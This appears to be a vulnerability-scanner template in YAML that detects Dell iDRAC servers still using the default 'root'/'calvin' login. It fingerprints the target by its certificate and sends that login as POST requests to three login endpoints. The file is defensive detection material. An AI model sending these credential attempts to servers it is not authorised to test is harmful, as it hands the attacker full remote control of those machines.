name: Dell_DARC_Default_Credentials
transport: http
set: {}
detail:
  dock: (cert="Remote Access Group" || cert="iDRAC Group") && cert="Dell Inc."
  product: Dell-DRAC
  homepage: https://www.delltechnologies.com/en-us/solutions/openmanage/idrac.htm
  impact: Remote attacker can use this default to control the server.
  description: 'The DARC administrator ''root'' has a password that is set to the
    default value of ''calvin''. As a result, anyone with access to the DARC port
    can trivially gain full access to the machine via arbitrary remote code execution. '
rules:
  r1:
    method: POST
    path: /data/login
    follow_redirects: false
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: user=root&password=calvin
    expression: response.body.bcontains(b'<authResult>0</authResult>') || response.body.bcontains(b'<authResult>5</authResult>')
  r2:
    method: POST
    path: /cgi-bin/webcgi/login
    follow_redirects: false
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: user=root&password=calvin&WEBSERVER_timeout=1800&WEBSERVER_timeout_select=1800
    expression: response.body.bcontains(b'/cgi-bin/webcgi/index') || response.body.bcontains(b'Connection
      refused, maximum sessions already in use')
  r3:
    method: POST
    path: /Applications/dellUI/RPC/WEBSES/create.asp
    follow_redirects: false
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: WEBVAR_USERNAME=root&WEBVAR_PASSWORD=calvin&WEBVAR_ISCMCLOGIN=0
    expression: 'response.body.bcontains(b''Failure_No_Free_Slot'') || response.body.bcontains(b''\''USERNAME\''
      : \''root\'''')'
expression: r1() || r2() || r3()
